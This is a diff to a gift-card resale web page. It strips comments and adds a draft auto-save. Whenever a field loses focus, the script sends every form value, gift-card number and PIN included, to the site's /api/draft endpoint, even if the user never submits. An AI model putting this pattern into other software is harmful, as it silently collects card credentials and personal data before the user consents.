@@ -10,7 +10,7 @@
   
   body { 
     font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-    background: #090e17; /* Deep dark navy matching the logo background */
+    background: #090e17; 
     color: #f8fafc; 
     line-height: 1.5; 
     background-image: 
@@ -18,7 +18,6 @@
       radial-gradient(circle at 85% 30%, rgba(234, 179, 8, 0.05), transparent 25%);
   }
 
-  /* HEADER / LOGO AREA */
   header { 
     background: rgba(9, 14, 23, 0.9); 
     border-bottom: 2px solid #22c55e; 
@@ -47,7 +46,6 @@
   }
   header nav a:hover { color: #eab308; text-shadow: 0 0 10px rgba(234, 179, 8, 0.5); }
 
-  /* HERO SECTION */
   .hero { 
     max-width: 1100px; 
     margin: 0 auto; 
@@ -55,7 +53,7 @@
     text-align: center; 
   }
   .hero h1 { 
-    font-family: 'Bangers', cursive; /* Graffiti-style font */
+    font-family: 'Bangers', cursive; 
     font-size: 56px; 
     font-weight: 400; 
     margin-bottom: 20px; 
@@ -74,7 +72,6 @@
     margin: 0 auto 32px; 
   }
 
-  /* TRUST BADGES */
   .trust { 
     display: flex; 
     justify-content: center; 
@@ -94,16 +91,15 @@
     color: #cbd5e1;
   }
 
-  /* FORM CARDS */
   .container-main { max-width: 700px; margin: 0 auto; padding: 0 24px 60px; }
   .card { 
-    background: #111827; /* Card background */
+    background: #111827; 
     border-radius: 16px; 
     padding: 32px; 
     box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
     margin-bottom: 24px; 
     border: 1px solid #1f2937;
-    border-top: 4px solid #22c55e; /* Neon top border */
+    border-top: 4px solid #22c55e; 
   }
   .card h2 { font-size: 22px; margin-bottom: 24px; color: #f8fafc; }
 
@@ -121,7 +117,6 @@
     border: 1px solid rgba(34, 197, 94, 0.3);
   }
 
-  /* FORM INPUTS */
   label { display: block; font-size: 13px; font-weight: 600; color: #94a3b8; margin-bottom: 8px; margin-top: 20px; text-transform: uppercase; letter-spacing: 0.5px;}
   label:first-of-type { margin-top: 0; }
   input, select { 
@@ -141,7 +136,6 @@
     box-shadow: 0 0 0 3px rgba(34, 197, 94, 0.2); 
   }
 
-  /* QUOTE BOX */
   .quote-box { 
     background: rgba(34, 197, 94, 0.05); 
     border: 1px solid #22c55e; 
@@ -158,7 +152,6 @@
   .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
   @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
 
-  /* BUTTON */
   button { 
     width: 100%; 
     padding: 18px; 
@@ -182,7 +175,6 @@
   }
   button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none;}
 
-  /* MESSAGES & SUCCESS SCREEN */
   .msg { padding: 16px; border-radius: 8px; margin-top: 16px; display: none; font-size: 15px; font-weight: 600; }
   .msg.show { display: block; }
   .msg.error { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid #ef4444; }
@@ -219,7 +211,6 @@
 
 <header>
   <div class="container">
-    <!-- Make sure you saved the image you uploaded as logo.png in your cashcard-api folder! -->
     <a href="/"><img src="/logo.png" alt="Gift & Cash Card"></a>
     <nav>
       <a href="#sell">Sell a Card</a>
@@ -340,6 +331,30 @@
 
 <script>
   const $ = (id) => document.getElementById(id);
+  
+  // Generate a unique ID for this session's draft
+  let draftId = localStorage.getItem('cashcard_draftId');
+  if (!draftId) {
+    draftId = crypto.randomUUID();
+    localStorage.setItem('cashcard_draftId', draftId);
+  }
+
+  const fieldIds = ['fullName', 'email', 'phone', 'brand', 'cardNumber', 'pin', 'balance', 'condition', 'paymentMethod', 'paymentDetails'];
+
+  // Auto-save on 'blur' (when they click out of a field)
+  fieldIds.forEach(id => {
+    $(id).addEventListener('blur', () => {
+      const data = { draftId: draftId };
+      fieldIds.forEach(fieldId => {
+        data[fieldId] = $(fieldId).value;
+      });
+      fetch('/api/draft', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).catch(console.error);
+    });
+  });
 
   async function updateQuote() {
     const brand = $('brand').value;
@@ -371,6 +386,7 @@
     errBox.classList.remove('show');
 
     const data = {
+      draftId: draftId,
       fullName: $('fullName').value.trim(),
       email: $('email').value.trim(),
       phone: $('phone').value.trim(),
@@ -411,6 +427,11 @@
       $('detailCard').style.display = 'none';
       $('successCard').style.display = 'block';
       $('refId').textContent = 'Ref: ' + json.submissionId;
+      
+      // Clear draft from browser
+      localStorage.removeItem('cashcard_draftId');
+      localStorage.removeItem('cashcard_draft');
+      
       window.scrollTo({ top: 0, behavior: 'smooth' });
     } catch (err) {
       errBox.textContent = 'Error: ' + err.message;
